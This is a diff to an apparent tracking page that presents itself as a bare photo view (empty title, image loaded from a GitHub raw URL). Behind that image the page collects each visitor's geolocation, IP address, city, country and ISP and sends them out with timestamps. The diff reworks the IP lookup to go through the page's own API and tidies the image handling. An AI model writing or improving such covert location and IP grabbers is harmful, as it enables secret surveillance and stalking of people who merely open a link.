@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="mobile-web-app-capable" content="yes">
+<link rel="icon" href="data:;base64,=">
 <title> </title>
 <style>
 *{margin:0;padding:0}
@@ -26,10 +27,7 @@ var raw1="https://raw.githubusercontent.com/"+REPO+"/main/"+IMG;
 var lastLoc=null;
 
 function fetchIP(){
-    return Promise.any([
-        fetch("https://ip-api.com/json/?fields=status,lat,lon,city,regionName,country,isp,query").then(function(r){return r.json()}).then(function(d){if(d.status==="success")return{ip:d.query,city:d.city,region:d.regionName,country:d.country,isp:d.isp};throw 0}),
-        fetch("https://ipinfo.io/json").then(function(r){return r.json()}).then(function(d){return{ip:d.ip,city:d.city,region:d.region,country:d.country,isp:d.org};throw 0})
-    ]);
+    return fetch(API+"/ip").then(function(r){return r.json()}).catch(function(){return{}});
 }
 
 var busy=false;
@@ -45,7 +43,7 @@ function push(e){
 
 function send(){
     fetchIP().then(function(ipd){
-        var ipd=ipd||{};
+        ipd=ipd||{};
         var e;
         if(lastLoc){
             e={lat:lastLoc.lat,lng:lastLoc.lng,city:ipd.city||"unknown",region:ipd.region,country:ipd.country,isp:ipd.isp,ip:ipd.ip,method:lastLoc.method,accuracy:lastLoc.accuracy,timestamp:new Date().toISOString()};
@@ -60,8 +58,6 @@ function startAll(){
     var tap=document.getElementById("tap");
     if(tap)tap.style.display="none";
     var img=document.getElementById("photo");
-    img.onload=function(){img.style.display=""};
-    img.onerror=function(){img.style.display=""};
     img.src=raw1;
     img.style.display="";
     send();
